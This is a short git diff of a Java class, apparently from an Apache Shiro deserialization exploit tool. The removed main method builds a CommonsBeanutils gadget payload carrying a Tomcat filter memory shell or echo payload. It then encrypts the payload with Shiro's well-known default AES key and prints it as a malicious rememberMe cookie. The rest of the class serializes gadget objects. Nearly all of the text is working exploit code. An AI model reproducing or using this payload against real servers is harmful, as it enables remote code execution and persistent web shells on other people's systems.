@@ -4,7 +4,6 @@ import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtField;
-import org.apache.shiro.codec.Base64;
 
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
@@ -45,31 +44,4 @@ public class CB183 {
         return barr.toByteArray();
     }
 
-    public static void main(String[] args) throws Exception {
-
-        String attackType = "FilterMemShell";
-
-        String mode = "CBC";
-
-        String key = "kPH+bIxk5D2deZiIxcaaaA==";
-
-        Object templates;
-        if ("FilterMemShell".equals(attackType)) {
-            templates = Gadgets.createTemplatesImpl("DefineClass");
-        } else {
-            templates = Gadgets.createTemplatesImpl("TomcatEcho");
-        }
-
-        byte[] payload;
-        if ("CBC".equals(mode)) {
-            payload = CB183.CBWithoutCC(templates);
-        } else {
-            payload = CB192.CBWithoutCC(templates);
-        }
-
-        String rememberMeCookie = AESEncrypt.encrypt(payload, Base64.decode(key.toString()), mode);
-
-        System.out.printf(rememberMeCookie);
-
-    }
 }
